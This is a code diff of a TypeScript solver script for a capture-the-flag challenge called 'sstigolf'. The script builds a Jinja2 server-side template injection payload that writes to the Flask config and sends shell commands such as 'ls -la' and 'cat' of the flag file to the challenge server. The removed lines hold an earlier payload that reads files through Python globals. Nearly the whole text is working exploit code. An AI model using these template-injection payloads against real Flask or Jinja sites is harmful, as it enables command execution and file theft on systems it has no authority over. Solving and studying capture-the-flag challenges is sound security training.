@@ -18,15 +18,11 @@
 
 // STEP 1: Update config variable with payload
 const updateConfig = async (payloadKey: string) => {
-    const flagFilename = 'an_arbitrarily_named_file';
-    let payload = `url_for.__globals__.os.read(url_for.__globals__.os.open('${flagFilename}', url_for.__globals__.os.O_RDONLY), 50)`;
-    payload = `ls -la`; // worked
-    payload = `cat ${flagFilename}`; // error
-    payload = `cat an_arbitrarily_named_file` // SOLUTION
-    let query = `{{config.update(${payloadKey}=request.args.get('${payloadKey}'))}}`;
+    const payload = `cat an_arbitrarily_named_file` // SOLUTION
+    const query = `{{config.update(${payloadKey}=request.args.get('${payloadKey}'))}}`;
     console.assert(query.length < 49);
     const baseURL = 'https://sstigolf.ictf2022.iciaran.com/';
-    let targetURL = new URL(`${baseURL}/ssti?${payloadKey}=${payload}&query=${query}`);
+    const targetURL = new URL(`${baseURL}/ssti?${payloadKey}=${payload}&query=${query}`);
 
     const response = await fetch(targetURL);
     const responseText = await response.text();
